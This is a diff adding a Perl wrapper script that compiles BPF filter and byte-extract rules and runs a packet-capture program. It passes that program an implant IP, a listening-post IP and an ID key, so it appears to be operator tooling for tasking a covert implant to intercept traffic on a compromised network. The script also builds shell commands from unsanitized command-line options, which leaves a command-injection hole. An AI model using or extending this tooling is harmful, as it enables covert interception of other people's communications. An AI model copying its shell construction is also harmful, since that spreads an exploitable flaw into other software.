@@ -1,0 +1,119 @@
+#! /usr/bin/env perl
+
+use Getopt::Long;
+
+$pathToCompilers = "UTILS/";
+
+sub usage {
+    print "
+@_:
+creates, compiles, uploads, and selects a filter and an extract for profiling
+  
+Usage: @_ \\
+    --skip <Skip count> \\
+    --take <Take count> \\
+    --extractout <Extract output file> \\
+    --filterrule <Rules for the filter> \\
+    --netmask <Netmask> \\
+    --filterout <Filter output file> \\
+    --extractID <Extract ID> \\
+    --filterID <Filter ID> \\
+    --cmd <Filter upload command> \\
+    --idkey <ID key> \\
+    --sport <Source port> \\
+    --dport <Destination port> \\
+    --lp <Listening post IP> \\
+    --implant <Implant IP> \\
+    --bsize <Benign size> \\
+    --logdir <Log directory>
+
+where:
+    --skip <Skip count>
+        Number of bytes to skip
+    --take <Take count>
+        Number of bytes to take after skipping
+    --extractout <Extract output file>
+        Output file for the compiled extract rule
+    --filterrule <Rules for the filter>
+        Filter rules, entered in one string e.g.:
+            \"ip and proto \\tcp or \\udp\"
+    --netmask <Netmask>
+        Netmask for the filter, in w.x.y.z format
+    --filterout <Filter output file>
+        Output file for the compiled filter rules
+    --extractID <Extract ID>
+        Extract ID number
+    --filterID <Filter ID>
+        Filter ID number
+
+and:
+    --cmd <Filter upload command>
+    --idkey <ID Key> --sport <Source port> --dport <Destination port>
+    --lp <Listening  post> --implant <Implant IP> --bsize <Benign size>
+    --logdir <Log directory>
+        are all provided by the LP
+\n";
+}
+
+GetOptions(
+    "skip=i",    "take=i",      "extractout=s", "filterrule=s",
+    "netmask=s", "filterout=s", "idkey=s",      "sport=s",
+    "dport=s",   "lp=s",        "implant=s",    "bsize=s",
+    "logdir=s",  "extractID=s", "filterID=s",   "cmd=s"
+);
+
+if (   !defined($opt_skip)
+    || !defined($opt_take)
+    || !defined($opt_extractout)
+    || !defined($opt_filterrule)
+    || !defined($opt_filterout)
+    || !defined($opt_netmask)
+    || !defined($opt_idkey)
+    || !defined($opt_sport)
+    || !defined($opt_dport)
+    || !defined($opt_lp)
+    || !defined($opt_implant)
+    || !defined($opt_bsize)
+    || !defined($opt_logdir)
+    || !defined($opt_extractID)
+    || !defined($opt_filterID)
+    || !defined($opt_cmd) )
+{
+    usage($0);
+    die;
+}
+
+$pathToX = sprintf( "%sextract.deleteMe", $pathToCompilers );
+$pathToF = sprintf( "%sfilter.deleteMe",  $pathToCompilers );
+
+if ( open( XTRACT, ">", $pathToX ) == -1 ) {
+    print "Error in opening extract\n";
+    die();
+}
+if ( open( FILTER, ">", $pathToF ) == -1 ) {
+    print "Error in opening filter\n";
+    die();
+}
+
+printf( XTRACT "%s %s",                   $opt_take,       $opt_skip );
+printf( FILTER "filter:%s\nnetmask:%s\n", $opt_filterrule, $opt_netmask );
+close(XTRACT);
+close(FILTER);
+
+$pathToXCompiler = sprintf( "%sxtrctcomp-3110", $pathToCompilers );
+if ( system("$pathToXCompiler $pathToX $opt_extractout") == -1 ) {
+    print "Error compiling extract\n";
+    die();
+}
+$pathToFCompiler = sprintf( "%sbpfcompiler-3110", $pathToCompilers );
+if ( system("$pathToFCompiler -i $pathToF -o $opt_filterout") == -1 ) {
+    print "Error compiling filter\n";
+    die();
+}
+
+system("rm $pathToX $pathToF");
+
+system(
+"./PacketCap_extractAndFilter-3110 --arg1 $opt_filterID --arg2 $opt_filterout --arg3 $opt_extractID --arg4 $opt_extractout --idkey $opt_idkey --sport $opt_sport --dport $opt_dport --lp $opt_lp --implant $opt_implant --bsize $opt_bsize --logdir $opt_logdir --filterup $opt_cmd"
+);
+
